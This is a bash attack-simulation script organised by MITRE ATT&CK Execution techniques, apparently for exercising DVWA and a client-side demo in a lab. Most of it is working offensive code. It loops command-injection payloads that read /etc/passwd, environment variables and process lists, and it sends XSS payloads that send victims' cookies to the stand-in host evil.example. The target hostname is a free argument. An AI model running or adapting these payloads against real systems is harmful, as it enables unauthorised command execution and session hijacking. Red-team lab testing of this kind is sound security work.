#!/bin/bash
# MITRE ATT&CK: Execution (TA0002)
# Techniques: T1059 Command/Scripting Interpreter, T1203 Exploitation for Client Execution
# Tools: curl, playwright (for JS execution)
set -uo pipefail

TARGET="${1:?Usage: 03-execution.sh <TARGET_FQDN>}"
BASE="${TARGET_PROTOCOL:-http}://${TARGET}"

echo "[*] MITRE ATT&CK TA0002: Execution against ${TARGET}"
echo ""

echo "=== T1059.004: Unix Shell Command Execution ==="
echo "    Technique: OS command injection via web application"

CMDI_PAYLOADS=(
  "127.0.0.1; id"
  "127.0.0.1; whoami"
  "127.0.0.1; uname -a"
  "127.0.0.1; cat /etc/passwd"
  "127.0.0.1; env"
  "127.0.0.1; ls -la /"
  "127.0.0.1; hostname"
  "127.0.0.1; ps aux"
  "127.0.0.1 && netstat -tlnp"
)

for payload in "${CMDI_PAYLOADS[@]}"; do
  encoded=$(python3 -c 'import sys, urllib.parse; print(urllib.parse.quote(sys.argv[1]))' "${payload}" 2>/dev/null)
  resp=$(curl -sf "${BASE}/dvwa/vulnerabilities/exec/?ip=${encoded}&Submit=Submit" --max-time 10 2>/dev/null)
  if echo "$resp" | grep -qiE "(uid=|root:|azureuser|Linux|eth0)" 2>/dev/null; then
    echo "  [VULN] T1059.004 Command executed: ${payload}"
    echo "         Output: $(echo "$resp" | grep -oE '(uid=[^ ]+|root:[^ ]+|Linux [^ ]+)' | head -1)"
  else
    echo "  [INFO] T1059.004 Payload sent: ${payload} (may need auth)"
  fi
done
echo ""

echo "=== T1059.007: JavaScript Execution ==="
echo "    Technique: XSS to execute JavaScript in victim browser context"

XSS_PAYLOADS=(
  '<script>document.location="http://evil.example/?c="+document.cookie</script>'
  '<img src=x onerror="fetch(\"http://evil.example/\"+document.cookie)">'
  '<svg onload="new Image().src=\"http://evil.example/?d=\"+document.domain">'
  '<body onload="window.open(\"http://evil.example/\"+document.cookie)">'
)

for payload in "${XSS_PAYLOADS[@]}"; do
  encoded=$(python3 -c 'import sys, urllib.parse; print(urllib.parse.quote(sys.argv[1]))' "${payload}" 2>/dev/null)
  code=$(curl -sf -o /dev/null -w "%{http_code}" "${BASE}/dvwa/vulnerabilities/xss_r/?name=${encoded}" --max-time 10 2>/dev/null) || code="ERR"
  echo "  [INFO] T1059.007 XSS payload delivered -> DVWA reflected: HTTP ${code}"
done
echo ""

echo "=== T1203: Exploitation for Client Execution ==="
echo "    Technique: Exploiting browser via malicious page content"
echo "  [INFO] CSD Demo attack toggles for client-side exploitation:"
curl -sf "${BASE}/csd-demo/health" 2>/dev/null | jq -r '.attacks[]' 2>/dev/null | while read -r atk; do
  echo "    - ${atk}"
done
echo ""

echo "[*] TA0002 Execution complete"
